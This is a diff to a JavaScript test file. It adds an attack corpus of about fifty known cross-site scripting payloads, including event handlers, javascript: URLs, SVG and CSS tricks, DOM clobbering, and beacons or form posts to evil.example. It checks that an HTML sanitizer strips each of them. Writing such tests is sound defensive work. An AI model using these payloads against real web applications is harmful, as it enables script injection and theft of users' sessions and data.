@@ -132,3 +132,85 @@ test('heading ids, #-links and code language label are kept only in safe form', 
   assert.equal(clean('<pre data-lang="x&quot;y"><code>x</code></pre>'), '<pre><code>x</code></pre>');
   assert.equal(clean('<li class="task task-done evil">x</li>'), '<li class="task task-done">x</li>');
 });
+
+// ---- attack corpus ----
+// The app runs with 'unsafe-inline' (it is one inline script), so this sanitizer is the only wall
+// between pasted HTML and the signed-in session. Each payload below is a known way through a weaker
+// filter. The assertion is about what is LEFT: no element or attribute that can run or load anything.
+const ATTACKS = [
+  '<img src=x onerror=alert(1)>',
+  '<img src="https://a.com/x.png" onerror="alert(1)" onload="alert(2)">',
+  '<IMG SRC=JaVaScRiPt:alert(1)>',
+  '<img src="jav&#x09;ascript:alert(1)">',
+  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
+  '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
+  '<svg/onload=alert(1)>',
+  '<svg><script>alert(1)</script></svg>',
+  '<svg class="chart-svg"><script>alert(1)</script><a href="javascript:alert(1)"><text>x</text></a><use href="#x"/><image href="https://a.com/x"/><foreignObject><p onclick="x()">t</p></foreignObject><animate attributeName="href" values="javascript:alert(1)"/><rect onclick="alert(1)" style="background:url(x)"/></svg>',
+  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
+  '<a href="javascript:alert(1)">x</a>',
+  '<a href="&#106;avascript:alert(1)">x</a>',
+  '<a href="java\tscript:alert(1)">x</a>',
+  '<a href="  javascript:alert(1)">x</a>',
+  '<a href="vbscript:msgbox(1)">x</a>',
+  '<a href="data:text/html,<script>alert(1)</script>">x</a>',
+  '<a href="https://a.com" target="_blank" onclick="alert(1)" ping="https://evil.example/p">x</a>',
+  '<a href="blob:https://a.com/1">x</a>',
+  '<a href="file:///etc/passwd">x</a>',
+  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
+  '<iframe src="javascript:alert(1)"></iframe>',
+  '<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">',
+  '<form action="https://evil.example"><input name=pin><button formaction="javascript:alert(1)">go</button></form>',
+  '<details open ontoggle=alert(1)><summary>x</summary></details>',
+  '<body onload=alert(1)><p onfocus=alert(1) autofocus tabindex=1>x</p>',
+  '<video><source onerror=alert(1)></video><audio src=x onerror=alert(1)>',
+  '<marquee onstart=alert(1)>x</marquee>',
+  '<link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example">',
+  '<base href="https://evil.example/">',
+  '<style>@import "https://evil.example/x.css"; p{background:url(https://evil.example/t)}</style>',
+  '<p style="background-image:url(https://evil.example/t)">x</p>',
+  '<p style="background:url(javascript:alert(1))">x</p>',
+  '<p style="width:expression(alert(1))">x</p>',
+  '<p style="color:red;behavior:url(x.htc);-moz-binding:url(x)">x</p>',
+  '<p style="color:re\\64;background:\\75rl(x)">x</p>',
+  '<p style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</p>',
+  '<div id="preview" name="body" class="palette modal-backdrop">clobber</div>',
+  '<a id="location" href="https://evil.example">x</a><form id="document"></form><img name="cookie" src="https://a.com/x.png">',
+  '<template><script>alert(1)</script></template><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
+  '<span data-md2-furniture="header" onmouseover="alert(1)" contenteditable="true" draggable="true">x</span>',
+  '<table background="javascript:alert(1)"><td background="javascript:alert(1)" colspan="1 onclick=alert(1)">x</td></table>',
+  '<font color="red;background:url(x)" size="7" face="x" onclick="alert(1)">x</font>',
+  '<h1 id="s-ok" onclick="x()">t</h1><h1 id="x onclick=alert(1)">t</h1>',
+  '<pre data-lang="js onclick=alert(1)">x</pre>',
+  '<!--<img src="--><img src=x onerror=alert(1)//">',
+  '<img src="https://a.com/x.png" srcset="https://evil.example/t 1x" usemap="#m" longdesc="javascript:alert(1)">',
+  '<a href="https://a.com" style="position:absolute;inset:0">x</a>',
+  '<p title="x" lang="fa" dir="rtl" formaction="javascript:alert(1)" xlink:href="javascript:alert(1)" xmlns:xlink="http://www.w3.org/1999/xlink">x</p>',
+];
+const SAFE_TAGS = new Set(('article header footer section main div p br h1 h2 h3 h4 h5 h6 strong b em i u s del mark sup sub small a code pre ' +
+  'ul ol li blockquote hr table caption thead tbody tfoot tr th td img aside span figure figcaption nav svg g rect path line polyline circle text tspan title').split(' '));
+const SAFE_ATTRS = new Set(('alt title dir lang colspan rowspan id data-lang data-md2-furniture class style href rel target src loading ' +
+  'viewBox x y x1 y1 x2 y2 cx cy r rx ry dy width height d points fill stroke stroke-width font-size opacity fill-opacity stroke-opacity ' +
+  'stroke-linecap stroke-linejoin font-weight text-anchor transform shape-rendering role aria-label').split(' '));
+
+test('attack corpus: nothing that can run, load or overlay survives', () => {
+  for (const payload of ATTACKS) {
+    const out = clean(payload);
+    const box = parseHTML(`<!doctype html><html><body>${out}</body></html>`).document.body;
+    for (const n of box.querySelectorAll('*')) {
+      const tag = n.localName.toLowerCase();
+      assert.ok(SAFE_TAGS.has(tag), `<${tag}> survived: ${payload}`);
+      const inSvg = !!n.closest('svg');
+      for (const a of n.attributes) {
+        assert.ok(SAFE_ATTRS.has(a.name), `${a.name} survived on <${tag}>: ${payload}`);
+        assert.ok(!/^on/i.test(a.name), payload);
+        if (a.name === 'href' && !inSvg) assert.match(a.value, /^(https?:\/\/|mailto:|tel:|#s-)/, payload);
+        if (a.name === 'src') assert.match(a.value, /^(https?:\/\/|data:image\/(png|jpe?g|webp|gif);base64,)/, payload);
+        if (a.name === 'style') assert.ok(!/url\s*\(|expression|javascript|position|z-index|binding|behavior|\\/i.test(a.value), `style "${a.value}": ${payload}`);
+        if (a.name === 'id') assert.match(a.value, /^s-/, payload);
+      }
+      if (inSvg) assert.ok(!n.hasAttribute('href'), payload);
+    }
+    assert.ok(!/javascript:|vbscript:|<script|onerror|onload|evil\.example\/(t|p|x\.css)/i.test(out), `left in output: ${out}  ←  ${payload}`);
+  }
+});
